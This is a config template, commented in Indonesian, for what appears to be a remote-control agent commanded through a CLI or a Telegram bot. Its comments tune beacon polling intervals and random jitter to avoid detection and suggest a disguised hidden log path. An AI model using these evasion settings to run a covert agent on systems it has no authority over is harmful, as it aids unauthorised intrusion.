# =============================================================
# KONFIGURASI AGENT — salin file ini jadi config.ini lalu isi
# =============================================================

# LETAKKAN TOKEN BOT TELEGRAM DISINI
# (dapatkan dari @BotFather — JANGAN pernah commit token asli ke git)
TELEGRAM_TOKEN=

# chat id kamu (tanya @userinfobot). Wajib diisi kalau CONTROL_MODE=telegram
TELEGRAM_CHAT_ID=

# mode kontrol: cli | telegram
#   cli      = kendali lokal lewat binary CLI (disarankan untuk v1)
#   telegram = agent poll bot API (opsional, lihat docs/DETECTION.md)
CONTROL_MODE=cli

# interval cek perintah, dalam detik.
# PERINGATAN: polling rapat = beacon mudah terdeteksi (lihat DETECTION.md)
# JANGAN di bawah600 detik untuk penggunaan nyata.
POLL_INTERVAL=3600

# tambahan acak (detik) supaya interval tidak beraturan
# contoh: interval riil = POLL_INTERVAL + rand(0..RAND_JITTER)
RAND_JITTER=600

# path log agent (opsional)
#AGENT_LOG=/tmp/.cache/.upd
